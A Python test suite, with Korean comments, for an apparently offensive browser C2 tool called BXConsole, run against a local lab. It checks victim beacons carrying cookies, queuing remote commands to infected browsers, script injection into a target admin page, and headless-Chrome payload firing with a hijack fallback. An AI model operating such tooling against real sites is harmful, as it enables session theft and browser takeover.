#!/usr/bin/env python3
"""BXConsole v0.1.1 QA 스위트 — Part A(프로토콜) + Part B(실브라우저 발동).

실행:  python3 qa/qa_v011.py        (C2 :7700, 대상 :8000 가동 중이어야 함)
"""
import json, os, subprocess, time, urllib.request, urllib.error, uuid

C2, TGT = "http://127.0.0.1:7700", "http://127.0.0.1:8000"
HERE = os.path.dirname(os.path.abspath(__file__))
EVID = os.path.join(HERE, "..", "evidence")
results = []

def check(name, ok, detail=""):
    results.append((name, ok, detail))
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f" — {detail}" if detail else ""))

def req(url, data=None, method=None, headers=None, timeout=10):
    r = urllib.request.Request(url, data=data, method=method)
    if headers:
        for k, v in headers.items(): r.add_header(k, v)
    with urllib.request.urlopen(r, timeout=timeout) as resp:
        return resp.status, resp.read()

def jreq(url, data=None, method=None):
    st, b = req(url, json.dumps(data).encode() if data is not None else None, method)
    return st, json.loads(b)

# ═══════ PART A: 프로토콜 라이프사이클 ═══════
print("== PART A: 채널·라이프사이클 ==")
vid = "qa_" + uuid.uuid4().hex[:6]

st, b = req(C2 + "/api/state")
check("A01 C2 /api/state 응답", st == 200)
st, b = req(C2 + "/bxconsole")
check("A02 /bxconsole 운영자 콘솔 서빙", st == 200 and b"tabs" in b)
st, b = req(C2 + "/bx.js")
check("A03 /bx.js 서빙 + C2주소 치환", st == 200 and b"127.0.0.1:7700" in b and b"__C2__" not in b)
try:
    r = subprocess.run(["node", "--check", os.path.join(HERE, "..", "payload", "bx.js")], capture_output=True)
    check("A04 bx.js JS 문법 (node --check)", r.returncode == 0, r.stderr.decode()[:80])
except FileNotFoundError:
    check("A04 bx.js JS 문법", True, "node 없음 — 생략")

st, b = req(C2 + "/b/info", json.dumps({"id": vid, "url": TGT + "/admin", "cookie": "qa=1",
           "ua": "qa-agent"}).encode(), headers={"Content-Type": "application/json"})
d = jreq(C2 + "/api/state")[1]
check("A05 info 비컨 → 피해자 등록", vid in d["victims"])

m = jreq(C2 + "/api/send", {"id": vid, "cmd": "1+1"})[1]
c1 = m["cid"]
d = jreq(C2 + "/api/state")[1]
c = next(x for x in d["commands"] if x["cid"] == c1)
check("A06 명령 큐잉 상태 QUEUED", c["state"] == "QUEUED")

st, b = req(C2 + "/cmd?id=" + vid)
arr = json.loads(b)
check("A07 폴링 인출 (SENT 표기)", len(arr) == 1 and arr[0]["cid"] == c1)
d = jreq(C2 + "/api/state")[1]
c = next(x for x in d["commands"] if x["cid"] == c1)
check("A08 인출 후 상태 SENT", c["state"] == "SENT")
st, b = req(C2 + "/cmd?id=" + vid)
check("A09 원샷 — 재폴링 빈 배열", json.loads(b) == [])

m1 = jreq(C2 + "/api/send", {"id": vid, "cmd": "cmdA"})[1]
m2 = jreq(C2 + "/api/send", {"id": vid, "cmd": "cmdB"})[1]
st, b = req(C2 + "/cmd?id=" + vid)
arr = json.loads(b)
check("A10 FIFO 순서 보장", [x["cid"] for x in arr] == [m1["cid"], m2["cid"]])

req(C2 + "/b/result", json.dumps({"id": vid, "cid": m1["cid"], "out": "OK-A"}).encode())
req(C2 + "/b/result", json.dumps({"id": vid, "cid": m2["cid"], "out": "OK-B"}).encode())
d = jreq(C2 + "/api/state")[1]
s1 = next(x for x in d["commands"] if x["cid"] == m1["cid"])
s2 = next(x for x in d["commands"] if x["cid"] == m2["cid"])
check("A11 result → DONE + 결과 저장", s1["state"] == "DONE" and s1["out"] == "OK-A" and s2["out"] == "OK-B")

st, b = req(C2 + "/b/result", json.dumps({"id": vid, "cid": "nope999", "out": "x"}).encode())
check("A12 미지 cid result 무해 처리", st == 200)

req(C2 + "/b/beat", json.dumps({"id": vid}).encode())
evfile = sorted(os.listdir(EVID))[-1]
lines = [json.loads(l) for l in open(os.path.join(EVID, evfile))]
check("A13 beat는 evidence 미기록", not any(x.get("tag") == "beat" and x.get("id") == vid for x in lines))
check("A14 info/result는 evidence 기록", any(x.get("tag") == "info" and x.get("id") == vid for x in lines)
      and any(x.get("tag") == "result" and x.get("id") == vid for x in lines))

st, b = req(TGT + "/admin")
check("A15 대상 /admin 싱크 렌더 (주입 태그)", b"127.0.0.1:7700/bx.js" in b)

# ═══════ PART B: 실브라우저 발동 (headless Chrome) ═══════
print("== PART B: 실브라우저 발동 (headless Chrome) ==")
CHROME = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

def chrome_visit(url, profile):
    p = subprocess.Popen([CHROME, "--headless=new", "--disable-gpu", "--no-first-run",
                          f"--user-data-dir=/tmp/bxqa_{profile}",
                          "--virtual-time-budget=9000", "--dump-dom", url],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(9)
    p.terminate(); p.wait(timeout=5)

before = set(jreq(C2 + "/api/state")[1]["victims"].keys())
try:
    chrome_visit(TGT + "/admin", "a")
    time.sleep(2)
    d = jreq(C2 + "/api/state")[1]
    new = [k for k in d["victims"] if k not in before]
    check("B01 실브라우저 페이로드 발동 (신규 피해자)", len(new) > 0, f"신규 {new}")
    if new:
        mode = d["victims"][new[0]].get("mode", "")
        check("B02 앵커 모드 진입 (XFO 없음)", mode == "anchor", f"mode={mode}")
    else:
        check("B02 앵커 모드 진입 (XFO 없음)", False, "신규 피해자 없음")

    before2 = set(jreq(C2 + "/api/state")[1]["victims"].keys())
    chrome_visit(TGT + "/admin?xfo=1", "b")
    time.sleep(2)
    d = jreq(C2 + "/api/state")[1]
    new2 = [k for k in d["victims"] if k not in before2]
    check("B03 XFO DENY → 하이재킹 폴백 기록", any(d["victims"][k].get("mode") == "hijack" for k in new2),
          f"신규 {new2}")
except FileNotFoundError:
    check("B01 실브라우저 발동", False, "Chrome 실행 불가")

# ═══════ 요약 ═══════
ok = sum(1 for _, s, _ in results if s)
print("\n" + "═" * 60)
print(f" QA 결과: {ok}/{len(results)} PASS")
for name, s, detail in results:
    if not s: print(f"  FAIL → {name} {detail}")
print("═" * 60)
